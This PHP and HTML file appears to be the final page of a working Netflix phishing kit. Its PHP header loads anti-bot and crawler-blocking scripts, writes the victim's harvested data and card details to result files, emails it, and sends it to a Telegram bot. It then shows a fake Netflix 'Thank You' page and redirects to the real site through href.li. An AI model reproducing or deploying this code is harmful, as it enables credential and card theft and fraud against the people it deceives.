<?php 
error_reporting(0);
session_start();
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include '../autob/bts2.php';
include '../req/config.php';

$PublicIP     = $_SERVER['REMOTE_ADDR'];
$Info_LOG = $_SESSION['device'];
		$_SESSION['fullz'].=$Info_LOG; 
// Don't Touch
//FTP == 1 save result >< == 0 don't save result
        if($Ftp_Write == 1 ){
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
		if($Send_Email == 1 && isset($_SESSION['fullz'])){
            $subject = '♥♥ Netflix END SESS10N ♥♥ '.$_SESSION['cardtype'].' ♥♥ '.$PublicIP;$headers = 'From: YoCHI <yochnetf@yochnet.com>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $_SESSION['fullz'], $headers);
		};
        if ($send_tg == 1 && isset($_SESSION['fullz'])) {
			sendtoTG($tgid, $_SESSION['fullz'], $tgtoken);
        };
		if(isset($_SESSION['fullz'])){
			$file = fopen("../../admin/Results.txt", 'a');
			fwrite($file, $_SESSION['fullz'].'r\n');
		fclose($file);};
setcookie($timecookie,md5($timecookie.'7f021a1415b86f2d013b2618fb31ae53y3r'),time()+86400*30,'/',$_SERVER['HTTP_HOST'],false,true);
session_destroy();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Success ! - Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><meta http-equiv="refresh" content="6,url=https://href.li/?https://netflix.com/"/><link type="text/css" rel="stylesheet" href="../oille/nul.css"><link type="text/css" rel="stylesheet" href="../oille/null.css"><link rel="shortcut icon" href="../fnset/favicon.ico">
<style>
	*{box-sizing:border-box;}	
	.svg-nfLogo .svg-icon-netflix-logo{box-sizing:content-box;}
	html{height:auto;}
	body{margin:0px;padding:0;height:100vh;}
	.thead{height:;width:100%;text-align:left;}
	.mainviewpar{padding:0;position:relative;background-color:#f1f1f1;}
    .mainview{width:100%;max-width:639px;margin:0 auto;text-align:center;color:#aaa;padding:10px 0;}
	.mainviewchild{margin:0 10px;padding:10px 20px;text-align:center;background-color:#fff;border: 1px solid #dcdde0;}
	@media only screen and (min-width:500px){.mainviewchild{}}
	@media only screen and (min-height:900px){.mainviewchild{margin:50px auto;}}
	.header_logo{display:inline-block;width:150px;height:45px;background:url('../fnset/hiconb.png') no-repeat;background-position:0 -9px; background-size:100%;}
	.vx_modal-header h1{font-size:1.6rem;;font-weight: 600;text-transform: none;font-family: Arial,sans-serif;border-bottom: 2px solid #dcdde0;padding-bottom:10px;}
	
	form{max-width:360px;margin:auto}
    input{width: 100%;height: 44px;padding: 0 15px ;line-height:44px;box-sizing:border-box;margin-bottom: 12px;border: 0px solid #B7B6B6;border-radius: 5px;font-size: 15px;background-color:#333;text-transform:capitalize;color: #ccc;}	
	select{width: 100%;height:44px;padding: 0 15px;color:#686159;box-sizing:border-box;margin-bottom: 12px;border: 0px solid #B7B6B6;border-radius: 6px;font-size: 14px;background-color:#333;-moz-padding-start: 0.5rem;-webkit-appearance: none;-moz-appearance: none;text-transform:capitalize;color: #ccc;}
    input:focus{border: 1px solid #009CDE;border-radius: 6px;outline:0;z-index:100;padding: 15px 18px 0;transition:padding 0.3s;}
    select:focus{border: 2px solid #009CDE;border-radius: 6px;outline:0;padding: 15px 18px 0;transition:padding 0.3s;}
	.notcapitalized{text-transform:none;}
	.cardImage_medium{margin:0px auto 10px;display:block;}
	.vx_form-group{position:relative}
	
	.hide{display:none;}
	.notification-critical{background: #E87C03;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    font-size: 14px;
    margin: 0 0 16px;
	padding: 10px 20px;
    vertical-align: middle;
    padding: 20px 10px;
    color: #fff;}
	.transitioning{height:100%;background-color:rgba(190,190,190,0.8);position:fixed;top:0;left:0;min-height:100%;width:100%;}
	.loader{content:"";position:relative; display: block;top:47%;margin:auto;height:50px;width:50px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid #E50914;border-radius:100%;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	.footer{position:relative;width:80%;margin:20px auto 0;text-align:center;padding:5px 30px;border-top:1px dotted #aaa;background-color:#f3f3f3;}
	@media only screen and (min-height:730px){.footer{position:absolute;margin-top:0;left:10%;bottom:0;}} 
	.nonjsAlert{color:#f00;background-color:#feeeee;border:1px solid #f00;border-width:1px 0;min-height:30px;line-height:30px;padding:0px 5px;}
	@media only screen and (min-width: 740px){
		.login-body:after {
		content: "";
		height: 106px;
		display: block;
		}
		.login-body {
		margin: 0 auto -236px;
		min-height: 100vh;
		background-color: transparent;
		max-width: 700px;
			}
	}
	#cvvcont,#expcont{width:48%;display:;float:left} #cvvcont{float:right;}
	.cvv{z-index:2;border-radius:50%;width:30px;height:30px;right:20px;position:absolute;top:8px;background-color:#555;color:#fff;font-weight:900;display:inline-block;line-height:30px;font-size:20px;text-align:center;}
	.cvv:active,.cvv:hover{background-color:#555;transition:background-color 0.3s;}
	.popbase{position:relative;}
	.popup{position:absolute;top:-50%;right:48px;margin:auto;width:80%;display:none;max-width:80%;border:1px solid #999;border-radius:0px;background-color:#fff;z-index:4;text-align:left;padding:5px;font-size:14px;box-shadow:7px 7px 7px ;} .popup>span{background-color:#777;color:#fff;padding:3px;border-radius:5px;width:30px;display:block;margin:auto;text-align:center;}
	.popup::after{content:'';line-height: 0;border:10px solid;border-color:transparent transparent transparent #686159;position: absolute;top:13px;right: -20px;z-index: 2;}
	.footer{position:relative;width:80%;margin:20px auto 0;text-align:center;padding:5px 30px;border-top:1px dotted #aaa;background-color:#f3f3f3;}
	@media only screen and (min-height:680px){.footer{position:absolute;margin-top:0;left:10%;bottom:0;}} 
	.isvbv{padding:0;box-sizing:border-box;margin-bottom: 12px;font-size: 13px;background-color:#fff;text-transform:capitalize;}
	.nonjsAlert{color:#f00;background-color:#feeeee;border:1px solid #f00;border-width:1px 0;min-height:30px;line-height:30px;padding:0px 5px;}
	@media only screen and (min-width: 740px){
.hybrid-login-form.hybrid-login-form-signup {
    min-height: 400px;
	}}
  
	.btn_info{width:100%;min-height:44px;box-sizing:border-box;margin-bottom: 10px;border: 0px solid #07c;border-radius: 1.5em;font-size: 16px;text-transform: capitalize;margin-top: 0; background-color:#E50914 !important; cursor: pointer;color: #fff;font-size: 17px;line-height: 1.47059;font-weight: 400;letter-spacing: -.022em;font-family: SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;display: inline-block;min-width: 30px;padding:11px 23px;text-align: center;text-decoration:none}	
	.loginSignUpSeparator{position:relative;border-top:1px dashed #777;margin:20px } .textInSeparator{top:-14px;left:45%;background-color:#000103;display:inline-block;padding:5px;position:absolute;}
	
</style>

</head>
<body><div id="appMountPoint"><div class="login-wrapper hybrid-login-wrapper"><div class="login-wrapper-background"><img class="concord-img vlv-creative" src="../fnset/website_small.jpg" srcset="../fnset/website_small.jpg 1000w, ../fnset/website_medium.jpg 1500w, ../fnset/website_large.jpg 1800w" alt=""/></div><div class="nfHeader login-header signupBasicHeader"><a href="" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div><div class="login-body"><div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.</div></div></noscript><div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container"><div class="hybrid-login-form-main"><h1> 
<header class="vx_modal-header"><h1>Thank You!</h1></header></h1><div class="ui-message-container <?php if(isset($_GET['err'])==false){echo "hide";};?>" id="errcont"><div data-uia="text" class="ui-message-contents" id="errctnt">Wrong Entries, Try Again</div></div>


<form>
<div id="mainview" class="mainview">
<div class="formbase">
<img src="../fnset/success.png" width="150px" style="margin-top:50px;"/>
<div class="vx_form-group vx_floatingLabel_active">You are set up and good to go</div>
<div class="loginSignUpSeparator"><span class="textInSeparator"></span></div>
<a href="https://href.li/?https://netflix.com/" class="btn_info" title="" onclick="load()">Next</a>
</div>
</div>
</form>
</div>

</div>

</div></div>
<div class="transitioning hide" id="loader">
<div class="loader">
&nbsp;
</div>
</div>
</div>
</div></div>

<div></div></body></html>